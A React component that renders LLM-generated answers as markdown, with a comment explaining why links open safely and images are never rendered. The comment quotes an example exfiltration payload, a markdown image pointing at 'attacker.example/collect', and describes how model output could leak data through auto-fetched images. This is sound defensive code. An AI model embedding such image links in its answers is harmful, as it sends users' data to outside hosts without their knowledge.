import ReactMarkdown from "react-markdown";

/** Bedrock's prose includes literal markdown (`**bold**`, numbered lists,
 * headings) that was previously shown as raw text -- found distracting
 * while testing. `react-markdown` never executes raw HTML (it parses to
 * React elements, not `dangerouslySetInnerHTML`), which matters here
 * since this text ultimately originates from an LLM completion, not
 * fully trusted static content, even though the safety pipeline already
 * constrains its factual content.
 *
 * Images are disabled outright, not just "not raw HTML": a second
 * independent review found that `![x](https://attacker.example/collect?…)`
 * still passes every existing safety check (none of them inspect
 * markdown link/image syntax at all) and renders as a real `<img>` the
 * browser fetches automatically, with no click needed -- a live
 * data-exfiltration/tracking vector for an app whose answers can embed
 * arbitrary model-generated URLs. This is a text Q&A app; nothing here
 * ever legitimately needs to render an image, so the fix is to never
 * create an `<img>` element at all rather than try to allow-list image
 * sources (an allow-list a single deployed origin could still trivially
 * satisfy would not close the tracking/exfiltration path anyway, since
 * query-string data can leave through any allowed host too). */
export function Markdown({ text }: { text: string }) {
  return (
    <div className="markdown">
      <ReactMarkdown
        components={{
          a: (props) => <a {...props} target="_blank" rel="noreferrer" />,
          img: ({ alt }) => <span className="markdown-image-disabled">[image{alt ? `: ${alt}` : ""} -- not rendered]</span>,
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  );
}
